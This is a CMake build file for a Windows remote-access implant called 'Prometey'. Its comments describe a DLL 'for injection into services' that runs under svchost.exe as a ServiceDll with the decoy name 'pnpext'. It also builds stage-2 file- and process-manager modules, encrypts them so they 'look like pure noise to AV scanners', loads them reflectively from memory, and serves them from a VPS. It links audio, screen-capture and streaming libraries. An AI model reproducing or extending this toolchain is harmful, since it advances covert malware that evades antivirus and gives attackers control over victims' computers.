cmake_minimum_required(VERSION 3.16)
project(Prometey)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Windows target only
if(NOT WIN32)
    message(FATAL_ERROR "This project targets Windows only")
endif()

# WebRTC stream (libdatachannel): optional
set(USE_WEBRTC_STREAM OFF)
find_package(LibDataChannel CONFIG QUIET)
if(LibDataChannel_FOUND)
    set(USE_WEBRTC_STREAM ON)
    message(STATUS "WebRTC stream: LibDataChannel found")
else()
    message(STATUS "WebRTC stream: LibDataChannel not found")
endif()

# Opus audio codec (static)
find_package(Opus CONFIG REQUIRED)
message(STATUS "Opus found: ${Opus_DIR}")

# OpenSSL (for TLS-encrypted WebSocket to VPS)
find_package(OpenSSL REQUIRED)
message(STATUS "OpenSSL found: ${OPENSSL_VERSION}")

# Common compile settings
set(COMMON_DEFS
    WIN32_LEAN_AND_MEAN
    NOMINMAX
    _WIN32_WINNT=0x0A00
    UNICODE
    _UNICODE
)

set(COMMON_LIBS
    ws2_32
    gdiplus
    d3d11
    dxgi
    psapi
    pdh
    shlwapi
    shell32
    advapi32
    user32
    gdi32
    ole32
    mfplat
    mfuuid
    mf
    strmiids
    wtsapi32
    userenv
)

# Static CRT
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")

# ══════════════════════════════════════════════
# Target 1: DLL (for injection into services)
# ══════════════════════════════════════════════
add_library(PrometeyDll SHARED
    main.cpp
    dllmain.cpp
)
set_target_properties(PrometeyDll PROPERTIES
    OUTPUT_NAME "pnpext"
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
)
target_compile_definitions(PrometeyDll PRIVATE ${COMMON_DEFS} BUILD_AS_DLL=1)
target_compile_options(PrometeyDll PRIVATE /W3 /O2 /EHsc /MP)
target_include_directories(PrometeyDll PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/third_party
)
target_link_libraries(PrometeyDll PRIVATE ${COMMON_LIBS} Opus::opus OpenSSL::SSL OpenSSL::Crypto)
target_sources(PrometeyDll PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/exports.def)
if(USE_WEBRTC_STREAM)
    target_sources(PrometeyDll PRIVATE webrtc_stream.cpp)
    target_compile_definitions(PrometeyDll PRIVATE USE_WEBRTC_STREAM=1)
    target_link_libraries(PrometeyDll PRIVATE LibDataChannel::LibDataChannel)
endif()

# EXE target removed — only DLL (svchost.exe ServiceDll) is used

# Copy config template to output
configure_file(
    ${CMAKE_CURRENT_SOURCE_DIR}/host_config.json.template
    ${CMAKE_BINARY_DIR}/bin/host_config.json
    COPYONLY
)

# ══════════════════════════════════════════════
# Stage-2 modules — built as standalone DLLs, then encrypted to .bin blobs.
# Each stage-2 DLL implements the Stage2 ABI (stage2_abi.h) and is loaded
# reflectively from memory by stage-1 at runtime.
#
# Build-time only: not shipped as .dll on disk. The post-build step runs
# _gen_stage2_blob.py which produces an AES-256-GCM encrypted .bin that
# looks like pure noise to AV scanners.
# ══════════════════════════════════════════════
function(add_stage2_module name src)
    add_library(${name} SHARED ${src})
    set_target_properties(${name} PROPERTIES
        RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/stage2
        MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
    )
    target_compile_definitions(${name} PRIVATE ${COMMON_DEFS})
    target_compile_options(${name} PRIVATE /W3 /O2 /EHsc /MP)
    target_include_directories(${name} PRIVATE
        ${CMAKE_CURRENT_SOURCE_DIR}
        ${CMAKE_CURRENT_SOURCE_DIR}/third_party
    )
    # Post-build: encrypt .dll → .bin using a fixed dev token.
    # For production, re-encrypt per-deployment with the actual room_token.
    add_custom_command(TARGET ${name} POST_BUILD
        COMMAND ${CMAKE_COMMAND} -E echo "[stage2] Encrypting ${name}.dll -> ${name}.bin"
        COMMAND python ${CMAKE_CURRENT_SOURCE_DIR}/_gen_stage2_blob.py
                dev-token
                $<TARGET_FILE:${name}>
                ${CMAKE_BINARY_DIR}/stage2/${name}.bin
        VERBATIM
    )
endfunction()

# Smoke-test / skeleton module — remove once real modules are in place.
add_stage2_module(Stage2Sample stage2_sample.cpp)

# Real stage-2 modules. Each encrypts to build/stage2/<name>.bin at build time.
# For deployment: re-encrypt with the real per-room token using _gen_stage2_blob.py,
# then drop into STAGE2_DIR/<token>/<name>.bin on the VPS (see server.py).
#
# NOTE: the output filename on disk uses the CMake target name. The stage2_loader
# cmd_to_module() map uses short names ("filemgr", "procmgr", ...) so post-build
# we also copy with the short name.
add_stage2_module(filemgr stage2_filemgr.cpp)
add_stage2_module(procmgr stage2_procmgr.cpp)

# ══════════════════════════════════════════════
# Stage2 smoke test harness — standalone EXE that loads Stage2Sample.bin
# reflectively and exercises the full pipeline. Used for CI / dev validation.
# ══════════════════════════════════════════════
add_executable(Stage2Test stage2_test.cpp)
set_target_properties(Stage2Test PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
)
target_compile_definitions(Stage2Test PRIVATE ${COMMON_DEFS})
target_compile_options(Stage2Test PRIVATE /W3 /O2 /EHsc)
target_include_directories(Stage2Test PRIVATE ${CMAKE_CURRENT_SOURCE_DIR})
target_link_libraries(Stage2Test PRIVATE OpenSSL::Crypto)
add_dependencies(Stage2Test Stage2Sample)

add_executable(Stage2FilemgrTest stage2_filemgr_test.cpp)
set_target_properties(Stage2FilemgrTest PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
)
target_compile_definitions(Stage2FilemgrTest PRIVATE ${COMMON_DEFS})
target_compile_options(Stage2FilemgrTest PRIVATE /W3 /O2 /EHsc)
target_include_directories(Stage2FilemgrTest PRIVATE ${CMAKE_CURRENT_SOURCE_DIR})
target_link_libraries(Stage2FilemgrTest PRIVATE OpenSSL::Crypto)
add_dependencies(Stage2FilemgrTest filemgr)

add_executable(Stage2ProcmgrTest stage2_procmgr_test.cpp)
set_target_properties(Stage2ProcmgrTest PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
)
target_compile_definitions(Stage2ProcmgrTest PRIVATE ${COMMON_DEFS})
target_compile_options(Stage2ProcmgrTest PRIVATE /W3 /O2 /EHsc)
target_include_directories(Stage2ProcmgrTest PRIVATE ${CMAKE_CURRENT_SOURCE_DIR})
target_link_libraries(Stage2ProcmgrTest PRIVATE OpenSSL::Crypto)
add_dependencies(Stage2ProcmgrTest procmgr)

add_executable(Stage2LoaderTest stage2_loader_test.cpp)
set_target_properties(Stage2LoaderTest PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
)
target_compile_definitions(Stage2LoaderTest PRIVATE ${COMMON_DEFS})
target_compile_options(Stage2LoaderTest PRIVATE /W3 /O2 /EHsc)
target_include_directories(Stage2LoaderTest PRIVATE ${CMAKE_CURRENT_SOURCE_DIR})
target_link_libraries(Stage2LoaderTest PRIVATE OpenSSL::Crypto)
add_dependencies(Stage2LoaderTest Stage2Sample)
